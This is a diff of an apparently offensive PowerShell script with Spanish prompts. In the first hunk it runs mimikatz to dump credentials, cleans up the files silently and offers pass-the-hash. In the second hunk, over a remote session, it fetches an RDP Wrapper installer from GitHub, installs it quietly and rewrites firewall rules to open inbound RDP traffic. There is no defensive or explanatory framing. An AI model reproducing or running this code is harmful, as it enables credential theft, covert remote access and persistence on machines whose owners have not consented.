@@ -85,7 +85,7 @@ $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
 	Expand-Archive .\mimikatz.zip
 	if($system -in '32 bits') { .\mimikatz\Win32\mimikatz.exe }
 	if($system -in '64 bits') { .\mimikatz\x64\mimikatz.exe }
-        del .\mimikatz\ , .\mimikatz.exe
+        del .\mimikatz\ , .\mimikatz.zip -Confirm:$false
 	Write-Host ""
         $hash = Read-Host -Prompt 'Quieres usar un hash local?'
 	Write-Host ""
@@ -222,9 +222,8 @@ $Host.UI.RawUI.ForegroundColor = 'Gray'
     else {
         Write-Host ""
         Write-Host "$version detectado, aplicando parche.."
-        invoke-command -session $RDP[0] -scriptblock { EnableTLS }
         invoke-command -session $RDP[0] -scriptblock {
-        Invoke-WebRequest -Uri "https://github.com/stascorp/rdpwrap/releases/download/v1.6.2/RDPWInst-v1.6.2.msi" -OutFile "RDPWInst-v1.6.2.msi" -UseBasicParsing
+        EnableTLS ; Invoke-WebRequest -Uri "https://github.com/stascorp/rdpwrap/releases/download/v1.6.2/RDPWInst-v1.6.2.msi" -OutFile "RDPWInst-v1.6.2.msi" -UseBasicParsing
         msiexec /i "RDPWInst-v1.6.2.msi" /quiet /qn /norestart 
         netsh advfirewall firewall delete rule name="Agente de sesión de RDP" 1> $null
         netsh advfirewall firewall add rule name="Agente de sesión de RDP" dir=in protocol=udp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 1> $null
